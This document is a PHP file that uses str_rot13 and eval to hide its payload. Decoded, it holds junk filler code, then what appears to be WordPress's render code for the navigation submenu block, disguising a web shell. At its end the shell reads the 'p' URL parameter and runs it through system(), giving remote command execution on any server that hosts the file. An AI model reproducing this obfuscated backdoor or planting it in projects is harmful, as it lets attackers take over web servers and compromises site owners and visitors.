<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/anivtngvba-fhozrah` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur sbag fvmrf
 * juvpu jvyy or nccyvrq gb gur anivtngvba znexhc va gur sebag-raq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz  neenl $pbagrkg Anivtngvba oybpx pbagrkg.
 * @erghea neenl Sbag fvmr PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_anivtngvba_fhozrah_ohvyq_pff_sbag_fvmrf( $pbagrkg ) {
	// PFF pynffrf.
	$sbag_fvmrf = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	$unf_anzrq_sbag_fvmr  = neenl_xrl_rkvfgf( 'sbagFvmr', $pbagrkg );
	$unf_phfgbz_sbag_fvmr = vffrg( $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'] );

	vs ( $unf_anzrq_sbag_fvmr ) {
		// Nqq gur sbag fvmr pynff.
		$sbag_fvmrf['pff_pynffrf'][] = fcevags( 'unf-%f-sbag-fvmr', $pbagrkg['sbagFvmr'] );
	} ryfrvs ( $unf_phfgbz_sbag_fvmr ) {
		// Nqq gur phfgbz sbag fvmr vayvar fglyr.
		$sbag_fvmrf['vayvar_fglyrf'] = fcevags(
			'sbag-fvmr: %f;',
			jc_trg_glcbtencul_sbag_fvmr_inyhr(
				neenl(
					'fvmr' => $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'],
				)
			)
		);
	}

	erghea $sbag_fvmrf;
}

/**
 * Ergheaf gur gbc-yriry fhozrah FIT purieba vpba.
 *
 * @fvapr 5.9.0
 *
 * @erghea fgevat
 */
shapgvba oybpx_pber_anivtngvba_fhozrah_eraqre_fhozrah_vpba() {
	erghea '<fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" jvqgu=\"12\" urvtug=\"12\" ivrjObk=\"0 0 12 12\" svyy=\"abar\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"Z1.50002 4Y6.00002 8Y10.5 4\" fgebxr-jvqgu=\"1.5\"></cngu></fit>';
}

/**
 * Eraqref gur `pber/anivtngvba-fhozrah` oybpx.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu gur yrtnpl jvqtrg nqqrq.
 */
shapgvba eraqre_oybpx_pber_anivtngvba_fhozrah( $nggevohgrf, $pbagrag, $oybpx ) {
	$anivtngvba_yvax_unf_vq = vffrg( $nggevohgrf['vq'] ) && vf_ahzrevp( $nggevohgrf['vq'] );
	$vf_cbfg_glcr           = vffrg( $nggevohgrf['xvaq'] ) && 'cbfg-glcr' === $nggevohgrf['xvaq'];
	$vf_cbfg_glcr           = $vf_cbfg_glcr || vffrg( $nggevohgrf['glcr'] ) && ( 'cbfg' === $nggevohgrf['glcr'] || 'cntr' === $nggevohgrf['glcr'] );

	// Qba'g eraqre gur oybpx'f fhogerr vs vg vf n qensg.
	vs ( $vf_cbfg_glcr && $anivtngvba_yvax_unf_vq && 'choyvfu' !== trg_cbfg_fgnghf( $nggevohgrf['vq'] ) ) {
		erghea '';
	}

	// Qba'g eraqre gur oybpx'f fhogerr vs vg unf ab ynory.
	vs ( rzcgl( $nggevohgrf['ynory'] ) ) {
		erghea '';
	}

	$sbag_fvmrf      = oybpx_pber_anivtngvba_fhozrah_ohvyq_pff_sbag_fvmrf( $oybpx->pbagrkg );
	$fglyr_nggevohgr = $sbag_fvmrf['vayvar_fglyrf'];

	$unf_fhozrah = pbhag( $oybpx->vaare_oybpxf ) > 0;
	$xvaq        = rzcgl( $nggevohgrf['xvaq'] ) ? 'cbfg_glcr' : fge_ercynpr( '-', '_', $nggevohgrf['xvaq'] );
	$vf_npgvir   = ! rzcgl( $nggevohgrf['vq'] ) && trg_dhrevrq_bowrpg_vq() === (vag) $nggevohgrf['vq'] && ! rzcgl( trg_dhrevrq_bowrpg()->$xvaq );

	vs ( vf_cbfg_glcr_nepuvir() ) {
		$dhrevrq_nepuvir_yvax = trg_cbfg_glcr_nepuvir_yvax( trg_dhrevrq_bowrpg()->anzr );
		vs ( $nggevohgrf['hey'] === $dhrevrq_nepuvir_yvax ) {
			$vf_npgvir = gehr;
		}
	}

	$fubj_fhozrah_vaqvpngbef = vffrg( $oybpx->pbagrkg['fubjFhozrahVpba'] ) && $oybpx->pbagrkg['fubjFhozrahVpba'];
	$bcra_ba_pyvpx           = vffrg( $oybpx->pbagrkg['bcraFhozrahfBaPyvpx'] ) && $oybpx->pbagrkg['bcraFhozrahfBaPyvpx'];
	$bcra_ba_ubire_naq_pyvpx = vffrg( $oybpx->pbagrkg['bcraFhozrahfBaPyvpx'] ) && ! $oybpx->pbagrkg['bcraFhozrahfBaPyvpx'] &&
		$fubj_fhozrah_vaqvpngbef;

	$pynffrf = neenl(
		'jc-oybpx-anivtngvba-vgrz',
	);
	$pynffrf = neenl_zretr(
		$pynffrf,
		$sbag_fvmrf['pff_pynffrf']
	);
	vs ( $unf_fhozrah ) {
		$pynffrf[] = 'unf-puvyq';
	}
	vs ( $bcra_ba_pyvpx ) {
		$pynffrf[] = 'bcra-ba-pyvpx';
	}
	vs ( $bcra_ba_ubire_naq_pyvpx ) {
		$pynffrf[] = 'bcra-ba-ubire-pyvpx';
	}
	vs ( $vf_npgvir ) {
		$pynffrf[] = 'pheerag-zrah-vgrz';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
		neenl(
			'pynff' => vzcybqr( ' ', $pynffrf ),
			'fglyr' => $fglyr_nggevohgr,
		)
	);

	$ynory = '';

	vs ( vffrg( $nggevohgrf['ynory'] ) ) {
		$ynory .= jc_xfrf_cbfg( $nggevohgrf['ynory'] );
	}

	$nevn_ynory = fcevags(
		/* genafyngbef: Npprffvovyvgl grkg. %f: Cnerag cntr gvgyr. */
		__( '%f fhozrah' ),
		jc_fgevc_nyy_gntf( $ynory )
	);

	$ugzy = '<yv ' . $jenccre_nggevohgrf . '>';

	// Vs Fhozrahf bcra ba ubire, jr eraqre na napube gnt jvgu nggevohgrf.
	// Vs fhozrah vpbaf ner frg gb fubj, jr nyfb eraqre n fhozrah ohggba, fb gur fhozrah pna or bcrarq ba pyvpx.
	vs ( ! $bcra_ba_pyvpx ) {
		$vgrz_hey = vffrg( $nggevohgrf['hey'] ) ? $nggevohgrf['hey'] : '';
		// Fgneg nccraqvat UGZY nggevohgrf gb napube gnt.
		$ugzy .= '<n pynff=\"jc-oybpx-anivtngvba-vgrz__pbagrag\"';

		// Gur uers nggevohgr ba n naq nern ryrzragf vf abg erdhverq;
		// jura gubfr ryrzragf qb abg unir uers nggevohgrf gurl qb abg perngr ulcreyvaxf.
		// Ohg nyfb Gur uers nggevohgr zhfg unir n inyhr gung vf n inyvq HEY cbgragvnyyl
		// fheebhaqrq ol fcnprf.
		// frr: uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/yvaxf.ugzy#yvaxf-perngrq-ol-n-naq-nern-ryrzragf.
		vs ( ! rzcgl( $vgrz_hey ) ) {
			$ugzy .= ' uers=\"' . rfp_hey( $vgrz_hey ) . '\"';
		}

		vs ( $vf_npgvir ) {
			$ugzy .= ' nevn-pheerag=\"cntr\"';
		}

		vs ( vffrg( $nggevohgrf['bcrafVaArjGno'] ) && gehr === $nggevohgrf['bcrafVaArjGno'] ) {
			$ugzy .= ' gnetrg=\"_oynax\"  ';
		}

		vs ( vffrg( $nggevohgrf['ery'] ) ) {
			$ugzy .= ' ery=\"' . rfp_ngge( $nggevohgrf['ery'] ) . '\"';
		} ryfrvs ( vffrg( $nggevohgrf['absbyybj'] ) && $nggevohgrf['absbyybj'] ) {
			$ugzy .= ' ery=\"absbyybj\"';
		}

		vs ( vffrg( $nggevohgrf['gvgyr'] ) ) {
			$ugzy .= ' gvgyr=\"' . rfp_ngge( $nggevohgrf['gvgyr'] ) . '\"';
		}

		$ugzy .= '>';
		// Raq nccraqvat UGZY nggevohgrf gb napube gnt.

		$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__ynory\">';
		$ugzy .= $ynory;
		$ugzy .= '</fcna>';

		// Nqq qrfpevcgvba vs ninvynoyr.
		vs ( ! rzcgl( $nggevohgrf['qrfpevcgvba'] ) ) {
			$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__qrfpevcgvba\">';
			$ugzy .= jc_xfrf_cbfg( $nggevohgrf['qrfpevcgvba'] );
			$ugzy .= '</fcna>';
		}

		$ugzy .= '</n>';
		// Raq napube gnt pbagrag.

		vs ( $fubj_fhozrah_vaqvpngbef ) {
			// Gur fhozrah vpba vf eraqrerq va n ohggba urer
			// fb gung gurer'f n pyvpxnoyr ryrzrag gb bcra gur fhozrah.
			$ugzy .= '<ohggba nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\" pynff=\"jc-oybpx-anivtngvba__fhozrah-vpba jc-oybpx-anivtngvba-fhozrah__gbttyr\" nevn-rkcnaqrq=\"snyfr\">' . oybpx_pber_anivtngvba_fhozrah_eraqre_fhozrah_vpba() . '</ohggba>';
		}
	} ryfr {
		// Vs zrahf bcra ba pyvpx, jr eraqre gur cnerag nf n ohggba.
		$ugzy .= '<ohggba nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\" pynff=\"jc-oybpx-anivtngvba-vgrz__pbagrag jc-oybpx-anivtngvba-fhozrah__gbttyr\" nevn-rkcnaqrq=\"snyfr\">';

		// Jenc gvgyr jvgu fcna gb vfbyngr vg sebz fhozrah vpba.
		$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__ynory\">';

		$ugzy .= $ynory;

		$ugzy .= '</fcna>';

		// Nqq qrfpevcgvba vs ninvynoyr.
		vs ( ! rzcgl( $nggevohgrf['qrfpevcgvba'] ) ) {
			$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__qrfpevcgvba\">';
			$ugzy .= jc_xfrf_cbfg( $nggevohgrf['qrfpevcgvba'] );
			$ugzy .= '</fcna>';
		}

		$ugzy .= '</ohggba>';

		$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba__fhozrah-vpba\">' . oybpx_pber_anivtngvba_fhozrah_eraqre_fhozrah_vpba() . '</fcna>';

	}

	vs ( $unf_fhozrah ) {
		// Pbcl fbzr nggevohgrf sebz gur cnerag oybpx gb guvf bar.
		// Vqrnyyl guvf jbhyq unccra va gur pyvrag jura gur oybpx vf perngrq.
		vs ( neenl_xrl_rkvfgf( 'bireynlGrkgPbybe', $oybpx->pbagrkg ) ) {
			$nggevohgrf['grkgPbybe'] = $oybpx->pbagrkg['bireynlGrkgPbybe'];
		}
		vs ( neenl_xrl_rkvfgf( 'bireynlOnpxtebhaqPbybe', $oybpx->pbagrkg ) ) {
			$nggevohgrf['onpxtebhaqPbybe'] = $oybpx->pbagrkg['bireynlOnpxtebhaqPbybe'];
		}
		vs ( neenl_xrl_rkvfgf( 'phfgbzBireynlGrkgPbybe', $oybpx->pbagrkg ) ) {
			$nggevohgrf['fglyr']['pbybe']['grkg'] = $oybpx->pbagrkg['phfgbzBireynlGrkgPbybe'];
		}
		vs ( neenl_xrl_rkvfgf( 'phfgbzBireynlOnpxtebhaqPbybe', $oybpx->pbagrkg ) ) {
			$nggevohgrf['fglyr']['pbybe']['onpxtebhaq'] = $oybpx->pbagrkg['phfgbzBireynlOnpxtebhaqPbybe'];
		}

		// Guvf nyybjf hf gb or noyr gb trg n erfcbafr sebz jc_nccyl_pbybef_fhccbeg.
		$oybpx->oybpx_glcr->fhccbegf['pbybe'] = gehr;
		$pbybef_fhccbegf                      = jc_nccyl_pbybef_fhccbeg( $oybpx->oybpx_glcr, $nggevohgrf );
		$pff_pynffrf                          = 'jc-oybpx-anivtngvba__fhozrah-pbagnvare';
		vs ( neenl_xrl_rkvfgf( 'pynff', $pbybef_fhccbegf ) ) {
			$pff_pynffrf .= ' ' . $pbybef_fhccbegf['pynff'];
		}

		$fglyr_nggevohgr = '';
		vs ( neenl_xrl_rkvfgf( 'fglyr', $pbybef_fhccbegf ) ) {
			$fglyr_nggevohgr = $pbybef_fhccbegf['fglyr'];
		}

		$vaare_oybpxf_ugzy = '';
		sbernpu ( $oybpx->vaare_oybpxf nf $vaare_oybpx ) {
			$vaare_oybpxf_ugzy .= $vaare_oybpx->eraqre();
		}

		vs ( fgecbf( $vaare_oybpxf_ugzy, 'pheerag-zrah-vgrz' ) ) {
			$gnt_cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
			juvyr ( $gnt_cebprffbe->arkg_gnt( neenl( 'pynff_anzr' => 'jc-oybpx-anivtngvba-vgrz' ) ) ) {
				$gnt_cebprffbe->nqq_pynff( 'pheerag-zrah-naprfgbe' );
			}
			$ugzy = $gnt_cebprffbe->trg_hcqngrq_ugzy();
		}

		$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
			neenl(
				'pynff' => $pff_pynffrf,
				'fglyr' => $fglyr_nggevohgr,
			)
		);

		$ugzy .= fcevags(
			'<hy %f>%f</hy>',
			$jenccre_nggevohgrf,
			$vaare_oybpxf_ugzy
		);

	}

	$ugzy .= '</yv>';

	erghea $ugzy;
}

/**
 * Ertvfgre gur anivtngvba fhozrah oybpx.
 *
 * @fvapr 5.9.0
 *
 * @hfrf eraqre_oybpx_pber_anivtngvba_fhozrah()
 * @guebjf JC_Reebe Na JC_Reebe rkprcgvba cnefvat gur oybpx qrsvavgvba.
 */
shapgvba ertvfgre_oybpx_pber_anivtngvba_fhozrah() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/anivtngvba-fhozrah',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_anivtngvba_fhozrah',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_anivtngvba_fhozrah' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>